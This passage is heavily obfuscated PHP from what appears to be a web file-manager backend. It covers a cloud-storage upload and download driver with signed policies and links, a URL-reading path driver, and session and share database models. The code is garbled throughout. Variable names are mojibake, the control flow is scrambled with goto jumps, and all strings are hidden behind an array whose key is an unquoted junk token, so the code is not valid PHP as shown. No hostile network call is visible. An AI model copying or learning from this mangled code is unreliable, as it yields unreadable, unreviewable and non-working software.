$F¢İÎ¼Úé[$eî†‰‰ï¨ï[1258]], $eî†‰‰ï¨ï[1252]); goto eÒœç†Óí“; eÒœç†Óí“: $d¥—œªÄø = $this->ussRequest($F—„ÁÒ†Àô, $eî†‰‰ï¨ï[228], !1, $BÁÒÙ¸´´ê); return $d¥—œªÄø[$eî†‰‰ï¨ï[1023]] ? $this->getPathOuter($Bò÷ÌøõÉÏ) : !1; goto Dİ„ÀŞ”šŒ; Cœ·¥²¹’Ó: if (!$d¥—œªÄø[$eî†‰‰ï¨ï[1023]]) { return !1; } $F¢İÎ¼Úé = $d¥—œªÄø[$eî†‰‰ï¨ï[1025]]; $aªØƒ¸¨–â = 0; goto eÏ˜ Î‡œ˜; F™˜ô·«·’: $AŒ“†ì©ñ£ = 1024 * 1024 * 10; $BÁÒÙ¸´´ê = array($eî†‰‰ï¨ï[1250], $eî†‰‰ï¨ï[1251] . $a„ê³¸ìÖ, $eî†‰‰ï¨ï[1252], $eî†‰‰ï¨ï[1253] . $AŒ“†ì©ñ£); $d¥—œªÄø = $this->ussRequest($F—„ÁÒ†Àô, $eî†‰‰ï¨ï[228], !1, $BÁÒÙ¸´´ê); goto Cœ·¥²¹’Ó; eÏ˜ Î‡œ˜: $dÎÅ¢š‰–İ = $F¢İÎ¼Úé[$eî†‰‰ï¨ï[1254]]; $c——…ØÂÓŞ = fopen($CØ†‹ÏÂä‹, $eî†‰‰ï¨ï[1159]); if (!$c——…ØÂÓŞ) { return !1; } goto aæ›¡ƒÅƒì; F¤Íé¨ñ«‘: $eî†‰‰ï¨ï =& $_SERVER[¨¤¼…´]; $a„ê³¸ìÖ = IO::size($CØ†‹ÏÂä‹); if ($a„ê³¸ìÖ <= 1024 * 1024 * 200) { $b½Â·É¨Ÿ = array($eî†‰‰ï¨ï[1249] . $CØ†‹ÏÂä‹); $d¥—œªÄø = $this->ussRequest($F—„ÁÒ†Àô, $eî†‰‰ï¨ï[228], $b½Â·É¨Ÿ); return $d¥—œªÄø[$eî†‰‰ï¨ï[1023]] ? $this->getPathOuter($F—„ÁÒ†Àô) : !1; } goto F™˜ô·«·’; Dİ„ÀŞ”šŒ: } private function uploadPart($D†óí´™µ, $AÕ±éŞïâ, &$bğÒó„ô‰ˆ) { $B¼ñ—î’©¨ =& $_SERVER[¨¤¼…´]; $E«‹ÊÖ¥Ì… = array($B¼ñ—î’©¨[1259], $B¼ñ—î’©¨[1257] . $AÕ±éŞïâ[$B¼ñ—î’©¨[1258]], $B¼ñ—î’©¨[1260] . $AÕ±éŞïâ[$B¼ñ—î’©¨[1254]], $B¼ñ—î’©¨[148] . $AÕ±éŞïâ[$B¼ñ—î’©¨[1255]]); $aŒçÎ¾š¤ = $this->ussRequest($D†óí´™µ, $B¼ñ—î’©¨[228], $bğÒó„ô‰ˆ, $E«‹ÊÖ¥Ì…); return !$aŒçÎ¾š¤[$B¼ñ—î’©¨[1023]] ? $aŒçÎ¾š¤[$B¼ñ—î’©¨[1023]] : $aŒçÎ¾š¤[$B¼ñ—î’©¨[1025]]; } public function uploadFormData($AÏ°ç¾ƒÛƒ, $e°ËÑ‡ = 3600) { return $this->uploadPolicy($AÏ°ç¾ƒÛƒ, $e°ËÑ‡); } public function multiUploadFormData($e¡ãîò’åò, $dç¹µË›ê® = 3600) { $FÕ½‚·‡ =& $_SERVER[¨¤¼…´]; $e…ÚĞïë¾ = (int) $GLOBALS[$FÕ½‚·‡[7]][$FÕ½‚·‡[87]]; return $this->uploadPolicy($e¡ãîò’åò, $dç¹µË›ê®, $e…ÚĞïë¾); } private function uploadPolicy($fß¿öÂˆêÆ, $Fè†™Ó‰¾‚ = 3600, $f ğÔöŞáø = 0) { goto c£™â¬˜¯º; Eà‘· ²œ¦: $A‘×ª˜ğô = array($C¦¥‰ã™Ú[1261] => $this->bucket, $C¦¥‰ã™Ú[1262] => $fß¿öÂˆêÆ, $C¦¥‰ã™Ú[1263] => time() + $Fè†™Ó‰¾‚, $C¦¥‰ã™Ú[1264] => $aõ™†ƒßù); if ($f ğÔöŞáø) { $A‘×ª˜ğô[$C¦¥‰ã™Ú[1181]] = $f ğÔöŞáø; } $a«®Œ“œÈğ = base64_encode(json_encode($A‘×ª˜ğô)); goto a¢«¼¼÷¡; a¢«¼¼÷¡: $fØ’Îí—„ô = base64_encode(hash_hmac($C¦¥‰ã™Ú[1231], "\120\x4f\123\124\46{$AÃ²ñİá}\46{$aõ™†ƒßù}\x26{$a«®Œ“œÈğ}", md5("{$this->userpass}"), !0)); $a¢”¬È®„ = array($C¦¥‰ã™Ú[1102] => $a«®Œ“œÈğ, $C¦¥‰ã™Ú[1265] => "\x55\x50\131\x55\116\40{$this->username}\72{$fØ’Îí—„ô}", $C¦¥‰ã™Ú[183] => $this->endpoint . $AÃ²ñİá); return $a¢”¬È®„; goto A’È…ÎÂ˜‡; c£™â¬˜¯º: $C¦¥‰ã™Ú =& $_SERVER[¨¤¼…´]; $AÃ²ñİá = $C¦¥‰ã™Ú[8] . $this->bucket; $aõ™†ƒßù = gmdate($C¦¥‰ã™Ú[1195]); goto Eà‘· ²œ¦; A’È…ÎÂ˜‡: } public function download($fÔÀ§¬Ì„, $Fî¢èÂ¥ŸÆ) { goto aÕƒØ‘‹; CåÛó˜…‹: fclose($Cš–éˆ®”Ê); return $Fî¢èÂ¥ŸÆ; goto b¨Ù†²Ä—“; aÕƒØ‘‹: $a‡’²©•í = IO::getPathInner(IO::mkfile($Fî¢èÂ¥ŸÆ)); if (!($Cì¤èêâÙ = $this->link($fÔÀ§¬Ì„))) { return !1; } $Dâ„ù²Ìë = 0; goto B¿øš¦“í; B¿øš¦“í: $dªá—åš» = 1024 * 200; $Cš–éˆ®”Ê = fopen($a‡’²©•í, $_SERVER[¨¤¼…´][1215]); while (!0) { $f‰·²ğ¢â = $this->fileSubstr($fÔÀ§¬Ì„, $Dâ„ù²Ìë, $dªá—åš»); if ($f‰·²ğ¢â === !1) { return !1; } fwrite($Cš–éˆ®”Ê, $f‰·²ğ¢â); $Dâ„ù²Ìë += $dªá—åš»; if (strlen($f‰·²ğ¢â) < $dªá—åš») { break; } } goto CåÛó˜…‹; b¨Ù†²Ä—“: } public function link($C–¯åÚƒÆ÷, $c‹Ö×–éï = array()) { $a…—º½°ö =& $_SERVER[¨¤¼…´]; $C–¯åÚƒÆ÷ = trim($C–¯åÚƒÆ÷, $a…—º½°ö[8]); if (!empty($this->token)) { $f«Ä½†Ë¯ = strtotime(date($a…—º½°ö[1266])); $D¥ÙŞøô¡¹ = substr(md5($this->token . $a…—º½°ö[285] . $f«Ä½†Ë¯ . $a…—º½°ö[1267] . $C–¯åÚƒÆ÷), 12, 8) . $f«Ä½†Ë¯; $c‹Ö×–éï[] = $a…—º½°ö[1268] . $D¥ÙŞøô¡¹; } $dßğ«½Ù¬ò = !empty($c‹Ö×–éï) ? $a…—º½°ö[79] . implode($a…—º½°ö[285], $c‹Ö×–éï) : $a…—º½°ö[43]; return $this->getHost() . $a…—º½°ö[8] . $C–¯åÚƒÆ÷ . $dßğ«½Ù¬ò; } public function fileOut($fáÑ¿¿ÜŸ, $AÁ°Ö”Óƒù = false, $F…ø³‹’¼ñ = false, $B©ã¤µ«Æ÷ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($fáÑ¿¿ÜŸ, $AÁ°Ö”Óƒù, $F…ø³‹’¼ñ, $B©ã¤µ«Æ÷); } if (!$F…ø³‹’¼ñ) { $F…ø³‹’¼ñ = $this->pathThis($fáÑ¿¿ÜŸ); } $Bõ¼Šçë = $AÁ°Ö”Óƒù ? array($_SERVER[¨¤¼…´][1269] . rawurlencode($F…ø³‹’¼ñ)) : array(); $Aà‚›Æù¦Ó = $this->link($fáÑ¿¿ÜŸ, $Bõ¼Šçë); $this->fileOutLink($Aà‚›Æù¦Ó); } public function fileOutServer($aØĞğÚİ, $dÙ¹éÛ‘¤ = false, $b‹‚È¤ì‘ç = false, $aæÇòˆ˜Í‚ = '') { parent::fileOut($aØĞğÚİ, $dÙ¹éÛ‘¤, $b‹‚È¤ì‘ç, $aæÇòˆ˜Í‚); } public function fileOutImage($D†¦¾ì°Ï’, $B ¥çœ„™Õ = 250) { $B˜Ä±è ×è = $this->link($D†¦¾ì°Ï’ . $_SERVER[¨¤¼…´][1270] . $B ¥çœ„™Õ); $this->fileOutLink($B˜Ä±è ×è); } public function fileOutImageServer($F–Ê«Šµ®, $fëÁ¸…Ìš = 250) { parent::fileOutImage($F–Ê«Šµ®, $fëÁ¸…Ìš); } public function hashMd5($DîºšòÈ¸¢) { $cÎ¢ËâÙ©ó =& $_SERVER[¨¤¼…´]; $dÁ…å¦»•¾ = $this->objectMeta($DîºšòÈ¸¢); return isset($dÁ…å¦»•¾[$cÎ¢ËâÙ©ó[210]]) ? $dÁ…å¦»•¾[$cÎ¢ËâÙ©ó[210]] : !1; } public function size($D²öÈ…ˆÔ) { $CøâÒ¾‹ = $this->objectMeta($D²öÈ…ˆÔ); return $CøâÒ¾‹ ? $CøâÒ¾‹[$_SERVER[¨¤¼…´][87]] : 0; } public function info($bÖ™ƒ¿ƒ„®) { if ($this->isFolder($bÖ™ƒ¿ƒ„®)) { return $this->folderInfo($bÖ™ƒ¿ƒ„®); } else { if ($this->isFile($bÖ™ƒ¿ƒ„®)) { return $this->fileInfo($bÖ™ƒ¿ƒ„®); } } return !1; } public function exist($eƒÚ³ñÚ©‘) { return $this->isFile($eƒÚ³ñÚ©‘) || $this->isFolder($eƒÚ³ñÚ©‘); } public function isFile($CÁ¥Ã’æ¯Û) { return !$this->isFolder($CÁ¥Ã’æ¯Û) && $this->objectMeta($CÁ¥Ã’æ¯Û); } public function isFolder($aÁÖØßù¨) { return $this->cacheMethod($_SERVER[¨¤¼…´][236], $aÁÖØßù¨); } protected function objectMeta($Dì§ÃÓÜò) { return $this->cacheMethod($_SERVER[¨¤¼…´][237], $Dì§ÃÓÜò); } protected function _objectMeta($aÒ¿öóÔî³) { goto D™ÍŒ±¿Š¡; D™ÍŒ±¿Š¡: $EÅ„Î¼“¡ =& $_SERVER[¨¤¼…´]; if ($aÒ¿öóÔî³ == $EÅ„Î¼“¡[43] || $aÒ¿öóÔî³ == $EÅ„Î¼“¡[8]) { return array(); } $B±…ÊÇÆñ‡ = $this->ussRequest($aÒ¿öóÔî³, $EÅ„Î¼“¡[1271]); goto Bëò“Ãˆô; Bëò“Ãˆô: if (!$B±…ÊÇÆñ‡[$EÅ„Î¼“¡[1023]]) { return null; } $aøÚÀ‚±Ä = isset($B±…ÊÇÆñ‡[$EÅ„Î¼“¡[1025]]) ? $B±…ÊÇÆñ‡[$EÅ„Î¼“¡[1025]] : array(); if (!isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1272]])) { return null; } goto fÇŞÀï§; fÇŞÀï§: $a¨Ø¡æ„ôÔ = array($EÅ„Î¼“¡[38] => get_path_this($aÒ¿öóÔî³), $EÅ„Î¼“¡[39] => isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1272]]) ? $aøÚÀ‚±Ä[$EÅ„Î¼“¡[1272]] : null, $EÅ„Î¼“¡[87] => isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1273]]) ? $aøÚÀ‚±Ä[$EÅ„Î¼“¡[1273]] : null, $EÅ„Î¼“¡[210] => isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1274]]) ? $aøÚÀ‚±Ä[$EÅ„Î¼“¡[1274]] : null, $EÅ„Î¼“¡[1242] => isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1275]]) ? $aøÚÀ‚±Ä[$EÅ„Î¼“¡[1275]] : null); $a¨Ø¡æ„ôÔ[$EÅ„Î¼“¡[1243]] = isset($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1276]]) ? strtotime($aøÚÀ‚±Ä[$EÅ„Î¼“¡[1276]]) : $a¨Ø¡æ„ôÔ[$EÅ„Î¼“¡[1242]]; return $a¨Ø¡æ„ôÔ; goto E–‚¹âŞ°†; E–‚¹âŞ°†: } protected function _isFolder($DÑç¼²‹ï¼) { $FÆíß¨ äÑ =& $_SERVER[¨¤¼…´]; if ($DÑç¼²‹ï¼ == $FÆíß¨ äÑ[43] || $DÑç¼²‹ï¼ == $FÆíß¨ äÑ[8]) { return !0; } $F‹òç‚ÕÚ = $this->objectMeta($DÑç¼²‹ï¼); return isset($F‹òç‚ÕÚ[$FÆíß¨ äÑ[39]]) && $F‹òç‚ÕÚ[$FÆíß¨ äÑ[39]] == $FÆíß¨ äÑ[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Aà‹Íœõäƒ = false) { } public function exist($Dªó«Õ³“) { $E˜ğ¯ÀÔ®× = $this->info($Dªó«Õ³“); return $E˜ğ¯ÀÔ®×[$_SERVER[¨¤¼…´][202]]; } public function isFile($a²¡Î‰¦˜ø) { $BŒ‰¿ï„Áö = $this->info($a²¡Î‰¦˜ø); return $BŒ‰¿ï„Áö[$_SERVER[¨¤¼…´][202]]; } public function isFolder($e•¤ô«ËÙ) { return !1; } public function size($dçŒÜôåè‘) { $bÎ™À®£³¤ = $this->info($dçŒÜôåè‘); return $bÎ™À®£³¤[$_SERVER[¨¤¼…´][87]]; } public function info($Aõ§Á¸ë‘¡) { return $this->infoParse($Aõ§Á¸ë‘¡); } public function infoAuth($d…êùŞ÷¯Š) { return $this->infoParse($d…êùŞ÷¯Š); } public function infoWithChildren($Bä§Ìõï’Õ) { return $this->infoParse($Bä§Ìõï’Õ); } public function infoFull($eàˆ¹»Ã­) { return $this->infoParse($eàˆ¹»Ã­); } private function infoParse($c¦íÔÅÄÃª) { $DõÈ’ñ¾˜ =& $_SERVER[¨¤¼…´]; $c¼äùõŠöÓ = $this->header($c¦íÔÅÄÃª); if (!$c¼äùõŠöÓ || !$c¼äùõŠöÓ[$DõÈ’ñ¾˜[679]]) { return !1; } $E²¬ÖğàÁ = _get($c¼äùõŠöÓ, $DõÈ’ñ¾˜[338], 0); $FéˆËŒƒ«¶ = array($DõÈ’ñ¾˜[38] => $c¼äùõŠöÓ[$DõÈ’ñ¾˜[38]], $DõÈ’ñ¾˜[85] => $c¦íÔÅÄÃª, $DõÈ’ñ¾˜[39] => $DõÈ’ñ¾˜[181], $DõÈ’ñ¾˜[87] => intval($E²¬ÖğàÁ), $DõÈ’ñ¾˜[175] => get_path_ext($c¼äùõŠöÓ[$DõÈ’ñ¾˜[38]]), $DõÈ’ñ¾˜[1152] => $E²¬ÖğàÁ > 0 && $c¼äùõŠöÓ[$DõÈ’ñ¾˜[1277]], $DõÈ’ñ¾˜[1153] => !1); return $FéˆËŒƒ«¶; } private function header($dé…ÀñÅ) { if (isset(self::$_cacheHeader[$dé…ÀñÅ])) { return self::$_cacheHeader[$dé…ÀñÅ]; } self::$_cacheHeader[$dé…ÀñÅ] = url_header($dé…ÀñÅ); return self::$_cacheHeader[$dé…ÀñÅ]; } public function hashSimple($E§ÉŸ÷¹ªœ, $eõ³Â‡¨ì„ = false) { goto F‚¥’Òäãˆ; FòŞÛ†„æö: $D ÜÒê×ä¨ = timeFloat(); $dï•Î¹ÒÂ½ = 15; for ($cƒ±Ï‘ğ°ª = 0; $cƒ±Ï‘ğ°ª < $cî•»È…ÍŞ; $cƒ±Ï‘ğ°ª++) { if (timeFloat() - $D ÜÒê×ä¨ > $dï•Î¹ÒÂ½) { return !1; } $cÄãŞ ‘© = $this->fileSubstr($E§ÉŸ÷¹ªœ, $Aó‹Ö—ÒÔÚ * $cƒ±Ï‘ğ°ª, $Fø…°ïš«‚); if (!$cÄãŞ ‘©) { return !1; } $EÍğéœÀÇ .= $cÄãŞ ‘©; } goto eÌï²¾Í×; D‘Ê‹¥©®ø: if ($DëÒéÃ´µø <= $Fø…°ïš«‚ * $cî•»È…ÍŞ) { return md5($this->fileSubstr($E§ÉŸ÷¹ªœ, 0, $DëÒéÃ´µø)) . $DëÒéÃ´µø; } $Aó‹Ö—ÒÔÚ = intval($DëÒéÃ´µø / $cî•»È…ÍŞ); $EÍğéœÀÇ = $Aº¢ô‹ÈĞ­[43]; goto FòŞÛ†„æö; F‚¥’Òäãˆ: $Aº¢ô‹ÈĞ­ =& $_SERVER[¨¤¼…´]; $E¦ø¾¬Æğ = $this->info($E§ÉŸ÷¹ªœ); if (!$E¦ø¾¬Æğ || !$E¦ø¾¬Æğ[$Aº¢ô‹ÈĞ­[202]]) { return !1; } goto dé§÷ç¿÷¤; eÌï²¾Í×: $EÍğéœÀÇ .= $this->fileSubstr($E§ÉŸ÷¹ªœ, $DëÒéÃ´µø - $Fø…°ïš«‚, $Fø…°ïš«‚); return md5($EÍğéœÀÇ) . $DëÒéÃ´µø; goto B‹’¿‰©ë; dé§÷ç¿÷¤: $DëÒéÃ´µø = $E¦ø¾¬Æğ[$Aº¢ô‹ÈĞ­[87]]; $Fø…°ïš«‚ = 200; $cî•»È…ÍŞ = 50; goto D‘Ê‹¥©®ø; B‹’¿‰©ë: } public function getContent($a«ÛÅ´È³ƒ) { return $this->fileSubstr($a«ÛÅ´È³ƒ); } public function fileSubstr($DŞÂ¢ÂøÉğ, $Bšô¸•çÇà = 0, $FĞ©Ù±¢à = -1) { goto c©‹ƒø©­ª; E°¡îÙê¡: $C¼é¢ë¢Ş¤ = url_request($DŞÂ¢ÂøÉğ, $D»àÙœ»¨[230], !1, $e¾§İ¯ø†, !1, !1, 1); return $C¼é¢ë¢Ş¤[$D»àÙœ»¨[1025]] ? $C¼é¢ë¢Ş¤[$D»àÙœ»¨[1025]] : $D»àÙœ»¨[43]; goto a×¦§£ø‹; c©‹ƒø©­ª: $D»àÙœ»¨ =& $_SERVER[¨¤¼…´]; $C¡ÖÅœõÕ = $this->info($DŞÂ¢ÂøÉğ); if (!$C¡ÖÅœõÕ || !$C¡ÖÅœõÕ[$D»àÙœ»¨[202]] && $C¡ÖÅœõÕ[$D»àÙœ»¨[87]] > 1024 * 1024 * 10) { return !1; } goto eáğ…°ëë; eáğ…°ëë: if ($FĞ©Ù±¢à === -1) { $FĞ©Ù±¢à = $C¡ÖÅœõÕ[$D»àÙœ»¨[87]]; } if ($FĞ©Ù±¢à == 0) { return $D»àÙœ»¨[43]; } $e¾§İ¯ø† = array($D»àÙœ»¨[1278] . $Bšô¸•çÇà . $D»àÙœ»¨[705] . ($Bšô¸•çÇà + $FĞ©Ù±¢à - 1)); goto E°¡îÙê¡; a×¦§£ø‹: } public function download($f¼‰ÏÁäÓ, $EŒÖØÀœª‰) { Downloader::start($f¼‰ÏÁäÓ, $EŒÖØÀœª‰); return $EŒÖØÀœª‰; } } goto a‘‘ÎÇã©ª; C”ùŸì‘âÓ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x73\x65\163\163\x69\x6f\156"; public function get($B‰Ëˆ•ãÄÅ) { $f”®¸ÇÓá¢ =& $_SERVER[¨¤¼…´]; $c‘¥‰Œ»Á = $this->where(array($f”®¸ÇÓá¢[2213] => $B‰Ëˆ•ãÄÅ))->find(); if (!is_array($c‘¥‰Œ»Á)) { return !1; } return $c‘¥‰Œ»Á[$f”®¸ÇÓá¢[682]]; } public function set($Aßİ”‚ƒñ, $E×ß¬ç‹‡Ü, $fµ““º‘Ö§ = 3600) { $bèËÅ²°…½ =& $_SERVER[¨¤¼…´]; $dçÛÉš‰ìÈ = array($bèËÅ²°…½[2213] => $Aßİ”‚ƒñ, $bèËÅ²°…½[2126] => $E×ß¬ç‹‡Ü, $bèËÅ²°…½[2214] => $fµ““º‘Ö§ + time()); if (Session::get($bèËÅ²°…½[2215])) { $dçÛÉš‰ìÈ[$bèËÅ²°…½[1425]] = Session::get($bèËÅ²°…½[2215]); } else { $dçÛÉš‰ìÈ[$bèËÅ²°…½[1425]] = 0; } if ($this->get($Aßİ”‚ƒñ)) { return $this->where(array($bèËÅ²°…½[2213] => $Aßİ”‚ƒñ))->save($dçÛÉš‰ìÈ); } else { return $this->add($dçÛÉš‰ìÈ, array(), !0); } } public function remove($AîŠ»×ÄÛğ) { return $this->where(array($_SERVER[¨¤¼…´][2213] => $AîŠ»×ÄÛğ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¨¤¼…´][2216] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\124\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\162\x74\x2c\x75\160\x64\141\164\145", "\146\165\x6e\x63\164\x69\157\156"), array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\x65\162\x74", "\146\x75\156\143\164\151\x6f\156"), array("\x6f\160\x74\151\157\156\163", '', "\151\156\x73\x65\162\164\x2c\165\x70\144\x61\x74\145\54\163\x65\154\145\143\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($FßÍ‚×±) { $dìğ•Ì’Ö =& $_SERVER[¨¤¼…´]; $E¤Üã–ºò¯ = isset($FßÍ‚×±[0]) ? $FßÍ‚×±[0] : !1; return array($dìğ•Ì’Ö[2217] => array(USER_ID, $dìğ•Ì’Ö[2218]), $dìğ•Ì’Ö[2166] => array($E¤Üã–ºò¯, $dìğ•Ì’Ö[2219])); } protected function listSimple() { $a¹ÑÒĞ‚®Ù = array($_SERVER[¨¤¼…´][1425] => USER_ID); $FÈ‚”‹šï = $this->field($this->fieldList)->where($a¹ÑÒĞ‚®Ù)->select(); return $FÈ‚”‹šï ? $FÈ‚”‹šï : array(); } protected function getInfo($EĞ¨Äƒ¯‡á, $eËØ¸¶Øˆ = false) { $B±—ÚÆóÃ =& $_SERVER[¨¤¼…´]; if ($eËØ¸¶Øˆ) { return $this->_getShareInfo(array($B±—ÚÆóÃ[452] => $EĞ¨Äƒ¯‡á)); } $eõãÍ‡ïğ‹ = $this->cacheFunctionGet($B±—ÚÆóÃ[2220], $EĞ¨Äƒ¯‡á); return $eõãÍ‡ïğ‹; } public function getInfoByHash($cô›èçØ‰Ë) { return $this->_getShareInfo(array($_SERVER[¨¤¼…´][454] => $cô›èçØ‰Ë)); } public function getInfoByPath($a„µ‚—È¹¶) { $Aâ•Ü£µØØ =& $_SERVER[¨¤¼…´]; $aÒ÷‹Ã‘¯ = array($Aâ•Ü£µØØ[1425] => USER_ID, $Aâ•Ü£µØØ[381] => $a„µ‚—È¹¶); return $this->_getShareInfo($aÒ÷‹Ã‘¯); } public function getInfoBySourcePath($FğÙ¦¢¥óÁ) { $D‡Ôø²ï££ =& $_SERVER[¨¤¼…´]; $cÃ°¥¼÷´ = array($D‡Ôø²ï££[1425] => USER_ID, $D‡Ôø²ï££[1010] => $FğÙ¦¢¥óÁ); return $this->_getShareInfo($cÃ°¥¼÷´); } private function _getShareInfo($Bï“ÛÒø–×) { goto DÙ²‹‰¨ˆ; bÆòÂò¡»”: $Bï“ÛÒø–× = array($A‹ª¶©Ô™Á[452] => $fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[452]]); $E…¿äÙ†¸í = $A‹ª¶©Ô™Á[2221]; $DßÆ–…„›§ = Model($A‹ª¶©Ô™Á[549])->order($A‹ª¶©Ô™Á[379])->field($E…¿äÙ†¸í)->where($Bï“ÛÒø–×)->select(); goto DàÌ¼çÜÑ–; DÙ²‹‰¨ˆ: $A‹ª¶©Ô™Á =& $_SERVER[¨¤¼…´]; $fİ©¯¿ÖˆÄ = $this->where($Bï“ÛÒø–×)->find(); if (!$fİ©¯¿ÖˆÄ) { return !1; } goto bÆòÂò¡»”; DàÌ¼çÜÑ–: if ($fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[381]] == $A‹ª¶©Ô™Á[481]) { $fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[403]] = IO::info($fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[1010]]); } else { $fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[403]] = Model($A‹ª¶©Ô™Á[1107])->pathInfo($fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[381]]); } $fİ©¯¿ÖˆÄ[$A‹ª¶©Ô™Á[2222]] = $DßÆ–…„›§; return $fİ©¯¿ÖˆÄ; goto a¶¢¾¿™‚‰; a¶¢¾¿™‚‰: } protected function getInfoAuth($c‡èÌ¥à) { $aï…¾¤¢ƒ =& $_SERVER[¨¤¼…´]; $cÈØËçÆìª = $this->getInfo($c‡èÌ¥à); $cÈØËçÆìª[$aï…¾¤¢ƒ[388]] = Model($aï…¾¤¢ƒ[467])->authMake($cÈØËçÆìª[$aï…¾¤¢ƒ[2222]]); return $cÈØËçÆìª; } protected function listData($dÄ×©Ô‹˜° = null, $c—ÁÁÛÁÀ = 300) { $dò¯·¢ŞÊ˜ =& $_SERVER[¨¤¼…´]; $FœÀ¯•è´Â = array(array($dò¯·¢ŞÊ˜[457] => array($dò¯·¢ŞÊ˜[912], 0), $dò¯·¢ŞÊ˜[459] => array($dò¯·¢ŞÊ˜[912], 0), $dò¯·¢ŞÊ˜[2223] => $dò¯·¢ŞÊ˜[2180])); if ($dÄ×©Ô‹˜° == $dò¯·¢ŞÊ˜[1860]) { $FœÀ¯•è´Â = array($dò¯·¢ŞÊ˜[457] => 1); } else { if ($dÄ×©Ô‹˜° == $dò¯·¢ŞÊ˜[995]) { $FœÀ¯•è´Â = array($dò¯·¢ŞÊ˜[459] => 1); } } $FœÀ¯•è´Â[$dò¯·¢ŞÊ˜[1425]] = USER_ID; $Fêîá©Û‘« = $this->where($FœÀ¯•è´Â)->selectPage($c—ÁÁÛÁÀ); return $Fêîá©Û‘«; } protected function listToMe($C·‚ğ×ƒÛˆ = 300) { goto fÇç“¾¤©; DçÊªÇ„Û: if ($eÌ„Šóñ±) { $aêÄŒ÷ÍË = array(array($Fº¨³•³ğ[534] => SourceModel::TYPE_USER, $Fº¨³•³ğ[469] => USER_ID), array($Fº¨³•³ğ[534] => SourceModel::TYPE_GROUP, $Fº¨³•³ğ[469] => array($Fº¨³•³ğ[7], $eÌ„Šóñ±)), $Fº¨³•³ğ[2223] => $Fº¨³•³ğ[2180]); } $Fº£˜ ¶Î¦ = Model($Fº¨³•³ğ[549])->where($aêÄŒ÷ÍË)->selectPage($C·‚ğ×ƒÛˆ); $f“Ë†–ÏÇó = array_to_keyvalue_group($Fº£˜ ¶Î¦[$Fº¨³•³ğ[367]], $Fº¨³•³ğ[452]); goto D«™ŸØ¦åæ; D«™ŸØ¦åæ: if (!$f“Ë†–ÏÇó) { return $Fº£˜ ¶Î¦; } $b£„åê£™ = $Fº¨³•³ğ[2225]; $aêÄŒ÷ÍË = array($Fº¨³•³ğ[452] => array($Fº¨³•³ğ[396], array_keys($f“Ë†–ÏÇó))); goto c½–ö¶ê§; fÇç“¾¤©: $Fº¨³•³ğ =& $_SERVER[¨¤¼…´]; $eÌ„Šóñ± = Model($Fº¨³•³ğ[2224])->userGroupParents(USER_ID); $aêÄŒ÷ÍË = array($Fº¨³•³ğ[534] => SourceModel::TYPE_USER, $Fº¨³•³ğ[469] => USER_ID); goto DçÊªÇ„Û; c½–ö¶ê§: $BŠ¶Ö–‚”˜ = $this->field($b£„åê£™)->where($aêÄŒ÷ÍË)->select(); foreach ($BŠ¶Ö–‚”˜ as $a×¸Ë¢¹øĞ => &$BÈ®Å‰Şá) { $BÈ®Å‰Şá[$Fº¨³•³ğ[2222]] = $f“Ë†–ÏÇó[$BÈ®Å‰Şá[$Fº¨³•³ğ[452]]]; } unset($BÈ®Å‰Şá); goto dØµÕ¬ŠäÖ; dØµÕ¬ŠäÖ: $c®‰¸÷ = array($Fº¨³•³ğ[2226] => $BŠ¶Ö–‚”˜, $Fº¨³•³ğ[2227] => $Fº£˜ ¶Î¦[$Fº¨³•³ğ[364]]); return $c®‰¸÷; goto c­©ºîÎ’‡; c­©ºîÎ’‡: } protected function shareAdd($d©¤¾–×ã¿, $a¨ƒ•¥÷²§) { $BÉà©éÅÛ¨ =& $_SERVER[¨¤¼…´]; $F„¾©ø…Ãâ = $this->_addShareData($d©¤¾–×ã¿, $a¨ƒ•¥÷²§); if (!empty($a¨ƒ•¥÷²§[$BÉà©éÅÛ¨[2228]])) { $this->_shareAuthSet($F„¾©ø…Ãâ, $a¨ƒ•¥÷²§[$BÉà©éÅÛ¨[2228]]); } $this->shareEventAdd($d©¤¾–×ã¿, $a¨ƒ•¥÷²§, $BÉà©éÅÛ¨[998]); return $F„¾©ø…Ãâ; } private function shareEventAdd($Aíºô¿–ÙÊ, $Fêë³Îœ’, $F¦£„«‚…ª = "\141\x64\x64") { goto bá²·Ş¾; a§²ŠÇ©»ö: $D‹‰¶…ÎÊ = $A‰ƒª˜Â[2231]; if ($B÷¸ÉÅ°ßš[$A‰ƒª˜Â[457]] == $A‰ƒª˜Â[481] && $Fêë³Îœ’[$A‰ƒª˜Â[457]] == $A‰ƒª˜Â[93]) { $D‹‰¶…ÎÊ = $A‰ƒª˜Â[2229]; } if ($B÷¸ÉÅ°ßš[$A‰ƒª˜Â[457]] == $A‰ƒª˜Â[93] && $Fêë³Îœ’[$A‰ƒª˜Â[457]] == $A‰ƒª˜Â[481]) { $D‹‰¶…ÎÊ = $A‰ƒª˜Â[2232]; } goto F±ëã´‘æ‚; b­“ä¾ÁšŠ: return; goto C†ä«¿¦ò‰; bá²·Ş¾: $A‰ƒª˜Â =& $_SERVER[¨¤¼…´]; if ($F¦£„«‚…ª == $A‰ƒª˜Â[998]) { if ($Fêë³Îœ’[$A‰ƒª˜Â[457]] == $A‰ƒª˜Â[93]) { Model($A‰ƒª˜Â[518])->eventShare($Aíºô¿–ÙÊ, 